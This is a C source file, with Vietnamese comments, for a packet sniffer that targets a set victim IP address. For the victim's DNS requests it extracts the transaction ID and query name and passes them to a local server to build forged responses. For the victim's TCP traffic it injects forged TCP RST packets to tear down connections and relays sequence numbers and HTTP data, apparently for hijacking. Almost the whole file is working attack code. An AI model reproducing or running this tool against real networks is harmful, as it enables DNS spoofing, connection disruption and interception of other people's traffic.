
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/if_ether.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <errno.h>
#include <stdarg.h>
#include <time.h>
#include <netinet/udp.h>
#include <netpacket/packet.h>
#include <stddef.h>  // for size_t

// Constants
#include "common.h"
#include "utils.h"
/**
    * @brief  Send a message to the local server for processing
*/
void send_to_local_server(struct tcp_conn_state *state, const char *data, int data_len) {
    int sockfd;
    struct sockaddr_in servaddr;
    char recv_buffer[1024];

    // Create UDP socket
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("socket creation failed");
        return;
    }

    // Configure server address
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(LOCAL_SERVER_PORT);
    servaddr.sin_addr.s_addr = inet_addr(LOCAL_SERVER_HOST);

    // Set socket timeout
    struct timeval tv;
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    // Add connection state info to message
    char message[4096];
    snprintf(message, sizeof(message),
            "%s\n"  // Use MSG_TYPE_HTTP macro
            "SEQ=%u\n"
            "ACK=%u\n" 
            "SPORT=%u\n"
            "DPORT=%u\n"
            "WINDOW=%u\n"
            "FLAGS=0x%02x\n"
            "DATA=%.*s",
            MSG_TYPE_HTTP,  // Use macro here
            state->seq, state->ack,
            state->sport, state->dport,
            state->window, state->flags,
            data_len, data);

    // Send message and handle response
    debug_log("Sending to server: %s", message);
    if (sendto(sockfd, message, strlen(message), 0, 
        (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
        debug_log("Failed to send: %s", strerror(errno));
        close(sockfd);
        return;
    }

    // Wait for acknowledgment
    socklen_t len = sizeof(servaddr);
    int n = recvfrom(sockfd, recv_buffer, sizeof(recv_buffer)-1, 0,
                     (struct sockaddr *)&servaddr, &len);
    
    if (n > 0) {
        recv_buffer[n] = '\0';
        debug_log("Received ACK: %s", recv_buffer);
    } else {
        debug_log("No acknowledgment received");
    }

    close(sockfd);
}

/**
    * @brief  Send a TCP RST packet to reset a connection
*/
void send_tcp_reset(struct iphdr *iph, struct tcphdr *tcph) {
    printf("[INFO] Sending TCP RST packet from %s to %s\n",
           inet_ntoa(*(struct in_addr*)&iph->daddr),
           inet_ntoa(*(struct in_addr*)&iph->saddr));

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("[ERROR] Socket creation failed");
        return;
    }

    printf("[INFO] Raw socket created\n");

    // Prepare RST packet buffer
    char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    memset(packet, 0, sizeof(packet));
    struct iphdr *ip = (struct iphdr *)packet;
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));

    // Setup IP header exactly like ICMP example
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(packet));
    ip->id = htons(rand());
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_TCP;
    ip->saddr = iph->daddr;  // Swap source and destination
    ip->daddr = iph->saddr;
    
    // Setup TCP header with exact sequence numbers
    tcp->th_sport = tcph->th_dport;
    tcp->th_dport = tcph->th_sport;
    tcp->th_seq = tcph->th_ack;
    tcp->th_ack = htonl(ntohl(tcph->th_seq) + 1);
    tcp->th_off = 5;
    tcp->th_flags = TH_RST | TH_ACK;
    tcp->th_win = 0;

    // Calculate checksums
    ip->check = 0;
    ip->check = calculate_checksum((const unsigned short *)ip, sizeof(struct iphdr));
    
    // Add TCP pseudo header checksum like ICMP example
    struct pseudo_header {
        uint32_t source_address;
        uint32_t dest_address;
        uint8_t placeholder;
        uint8_t protocol;
        uint16_t tcp_length;
    } psh;

    psh.source_address = ip->saddr;
    psh.dest_address = ip->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr));

    char *pseudogram = malloc(sizeof(psh) + sizeof(struct tcphdr));
    memcpy(pseudogram, &psh, sizeof(psh));
    memcpy(pseudogram + sizeof(psh), tcp, sizeof(struct tcphdr));
    tcp->th_sum = calculate_checksum((const unsigned short*)pseudogram, 
                                   sizeof(psh) + sizeof(struct tcphdr));
    free(pseudogram);

    printf("[DEBUG] TCP RST packet created with SEQ=%u ACK=%u\n", 
           ntohl(tcp->th_seq), ntohl(tcp->th_ack));

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = ip->daddr;

    // Send RST packet multiple times like ICMP example
    for(int i = 0; i < 3; i++) {
        if (sendto(sock, packet, sizeof(packet), 0, 
            (struct sockaddr *)&dest, sizeof(dest)) < 0) {
            perror("[ERROR] sendto() failed");
        } else {
            printf("[SUCCESS] RST packet %d sent to %s\n", 
                   i+1, inet_ntoa(dest.sin_addr));
        }
        usleep(1000);
    }

    close(sock);
}

/**
    * @brief  Send a DNS request to the local server for processing
*/
void send_dns_to_local_server(struct dns_info *dns, uint16_t sport) {
    int sockfd;
    struct sockaddr_in servaddr;
    char recv_buffer[1024];

    // Create and configure socket
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        debug_log("Socket creation failed");
        return;
    }

    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(LOCAL_SERVER_PORT);
    servaddr.sin_addr.s_addr = inet_addr(LOCAL_SERVER_HOST);

    // Format DNS request message
    char message[1024];
    snprintf(message, sizeof(message),
            "%s\n"  // Use MSG_TYPE_DNS macro
            "TXID=%u\n"
            "QUERY=%s\n" 
            "SPORT=%u\n",
            MSG_TYPE_DNS,  // Use macro here
            dns->txid, dns->query, sport);

    // Send and receive response
    if (sendto(sockfd, message, strlen(message), 0,
               (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
        debug_log("Failed to send DNS info");
    } else {
        socklen_t len = sizeof(servaddr);
        int n = recvfrom(sockfd, recv_buffer, sizeof(recv_buffer)-1, 0,
                     (struct sockaddr *)&servaddr, &len);
        if (n > 0) {
            recv_buffer[n] = '\0';
            debug_log("Received ACK: %s", recv_buffer);
        }
    }

    close(sockfd);
}

/*
CHỨC NĂNG:
1. Bắt các DNS request từ victim (port 53)
2. Parse DNS header để lấy transaction ID và query name
3. Forward DNS info tới local_server để tạo fake response
4. Không cần gửi RST cho DNS packets
*/

/**
    * @brief  Process a captured packet
*/
void process_packet(unsigned char *packet, int size) {
    struct iphdr *iph = (struct iphdr*)(packet + SIZE_ETHERNET);
    
    // STEP 1: Bắt và phân tích DNS request
    if (iph->protocol == IPPROTO_UDP) {
        struct udphdr *udph = (struct udphdr*)(packet + SIZE_ETHERNET + iph->ihl*4);
        
        printf("\n=== STEP 1: DNS Request Capture ===\n");
        printf("Source IP: %s\n", inet_ntoa(*(struct in_addr*)&iph->saddr));
        printf("Source Port: %d\n", ntohs(udph->uh_sport));
        printf("Dest Port: %d\n", ntohs(udph->uh_dport));
        
        // Kiểm tra DNS request từ victim
        if (ntohs(udph->uh_dport) == 53 && 
            strcmp(inet_ntoa(*(struct in_addr*)&iph->saddr), VICTIM_IP) == 0) {
            
            printf("\n[+] Valid DNS request detected!\n");
            
            // STEP 2: Parse DNS request
            struct dns_info dns = {0};
            char *dns_data = (char*)(packet + SIZE_ETHERNET + iph->ihl*4 + sizeof(struct udphdr));
            
            memcpy(&dns.txid, dns_data, 2); 
            dns.txid = ntohs(dns.txid);
            
            // Extract domain name
            char *query = dns_data + 12;
            int query_len = 0;
            while(query[query_len] && query_len < 255) query_len++;
            
            memcpy(dns.query, query, query_len);
            dns.query[query_len] = '\0';
            dns.src_port = ntohs(udph->uh_sport);
            
            printf("\n=== STEP 2: DNS Request Info ===\n");
            printf("Transaction ID: %u\n", dns.txid);
            printf("Query Domain: %s\n", dns.query);
            printf("Source Port: %u\n", dns.src_port);
            
            // STEP 3: Forward tới local_server
            printf("\n=== STEP 3: Forwarding to Local Server ===\n");
            send_dns_to_local_server(&dns, dns.src_port);
        }
    }

    if (iph->protocol == IPPROTO_TCP) {
        struct tcphdr *tcph = (struct tcphdr*)(packet + SIZE_ETHERNET + iph->ihl*4);
        struct sockaddr_in source;
        source.sin_addr.s_addr = iph->saddr;

        if (strcmp(inet_ntoa(source.sin_addr), VICTIM_IP) == 0) {
            printf("[INFO] TCP packet captured from %s:%d to port %d\n",
                   VICTIM_IP, ntohs(tcph->th_sport), ntohs(tcph->th_dport));

            // Store connection state
            struct tcp_conn_state state = {
                .seq = ntohl(tcph->th_seq),
                .ack = ntohl(tcph->th_ack),
                .sport = ntohs(tcph->th_sport),
                .dport = ntohs(tcph->th_dport),
                .window = ntohs(tcph->th_win),
                .flags = tcph->th_flags
            };

            // Extract HTTP data
            int header_size = SIZE_ETHERNET + (iph->ihl * 4) + (tcph->th_off * 4);
            char *data = packet + header_size;
            int data_len = size - header_size;

            // First send RST to kill original connection
            send_tcp_reset(iph, tcph);

            // Then forward complete connection info to local server
            send_to_local_server(&state, data, data_len);
        }
    }
}

int main() {
    int sockfd;
    struct ifreq ifr;
    unsigned char *buffer = malloc(MAX_ETHER);
    
    // Create raw socket
    sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if(sockfd < 0) {
        error("Socket creation failed");
    }

    // Get interface index
    strncpy(ifr.ifr_name, INTERFACE, IFNAMSIZ);
    if(ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0) {
        error("SIOCGIFINDEX failed");
    }

    debug_log("Sniffer started on %s", INTERFACE);
    debug_log("Watching victim IP: %s", VICTIM_IP); 
    debug_log("Forwarding to: %s:%d", LOCAL_SERVER_HOST, LOCAL_SERVER_PORT);

    while(1) {
        int packet_size = recvfrom(sockfd, buffer, MAX_ETHER, 0, NULL, NULL);
        if(packet_size > 0) {
            process_packet(buffer, packet_size);
        }
    }

    close(sockfd);
    free(buffer);
    return 0;
}